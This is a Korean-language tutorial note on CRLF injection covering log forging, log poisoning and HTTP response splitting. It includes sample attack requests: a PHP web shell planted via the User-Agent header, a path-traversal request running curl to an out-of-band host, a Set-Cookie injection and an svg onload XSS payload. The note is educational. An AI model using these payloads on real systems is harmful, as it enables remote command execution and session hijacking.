# CRLF Injection


## CRLF 란?
- 타자기 시절부터 줄 바꿈(New Line)을 사용하던 방식
- CR + LF가 합쳐진 용어
    - CR(Carriage Return)
        - 현재 라인에서 커서 위치를 줄 올림 없이 가장 앞으로 옮기는 동작
        - ASCII Code: `ASCII 13` 
        - URL Encode: `%0D`
        - Char: `\r`
    - LF(Line Feed)
        - 커서의 위치는 그대로 두고 종이를 한 라인 위로 올리는 동작
        - ASCII Code: `ASCII 10`
        - URL Encode: `%0A`
        - Char: `\n`


## CRLF Injection이란?
- Carrage Return Line Feed Injection의 약자
- 개행 문자를 의미하는 CR과 LF를 이용하여 공격자가 의도한 동작을 수행시키는 공격 기법


### 1) Log Injection
- 사용자 입력이 로그에 포함되는 경우 공격자가 이를 이용해 로그 항목을 위조하거나 악성 내용을 로그에 삽입할 수 있다.


#### [1] Log Forging
- 사용자 입력이 Log에 반영되는 부분이 있다면 CRLF 문자를 이용하여 새로운 Log를 작성할 수 있다.
- 이러한 Log는 침해 사고 분석을 어렵게 할 수 있고, Log의 무결성을 해쳐서 Log의 신뢰도를 떨어뜨리고, Log가 가지는 부인 방지로서의 목적을 상실하게 할 수 있다.  

정상 요청과 로그
```
GET /?query=aaaa
```
```
['A' User][error][input: aaaa] invalid data
```
공격 요청과 로그
```
GET /?query=aaaa]%20invalid%20data%0d%0a['B' User][token]%20re-generate%20token
```
```
['A' User][error][input: aaaa] invalid data
['B' User][token] re-generate token
```


#### [2] Log Poisoning
- Log 데이터를 통제할 수 있고, 서비스 내 LFI, Path Traversal 취약점이 있는 경우 Log 파일의 경로를 유추하여 RCE 등 위험도를 높일 수 있다.  

First Request (Log Poisoning)
```
GET / HTTP/1.1
```
```
User-Agent: aa<?php echo system($_GET['cmd']); ?>bb
```
Second Request (Path Traversal)
- 요청 내 `curl` 명령어가 실행
```
GET /file.php?path=/var/log/apache2/access.log?cmd=curl%20<OAST>/rce HTTP/1.1
```


### 2) HTTP 응답 분할(HTTP Response Splitting)
- *CWE-113*
- 응답(Response)에 줄 바꿈 문자(CR/LF)를 삽입(Injection)해 하나의 HTTP 응답을 분리(Splitting)하여 여러 개의 HTTP 응답을 만들어 내어 캐시 서버(Cache Server)나 프록시 서버(Proxy Server)에 변조된 컨텐츠를 전송하여 조작할 수 있는 기법


#### [1] Add Cookie
- CRLF가 삽입된 구문이 Header에 반영되는 경우 임의로 Cookie를 삽입할 수 있다.
```
GET /redirect?location=ws://%0d%0aSet-Cookie: session=attackersessions;
```
```
HTTP/1.1 200 OK
Location: ws://
Set-Cookie: session=attackersessions;
```


#### [2] XSS
- CRLF가 삽입된 구문이 Header에 반영되는 경우 `\r\n\r\n`과 같이 두 번 개행하여 Response Body 영역에 임의로 HTML 코드를 추가하여 XSS와 동일하게 사용자 브라우저에서 Script를 실행할 수 있다.
```
GET /redirect?location=ws://%0d%0a%0d%0a<svg/onload=alert(45)>
```
```
HTTP/1.1 200 OK
Location: ws://

<svg/onload=alert(45)>
```


# 참고문헌
- [Log Injection](https://www.hahwul.com/cullinan/log-injection/)
- [CRLF Injection](https://www.hahwul.com/cullinan/crlf-injection/)
- [CR-LF INJECTION](https://zzzmilky.tistory.com/entry/%EC%9B%B9%ED%95%B4%ED%82%B9-CR-LF-INJECTION)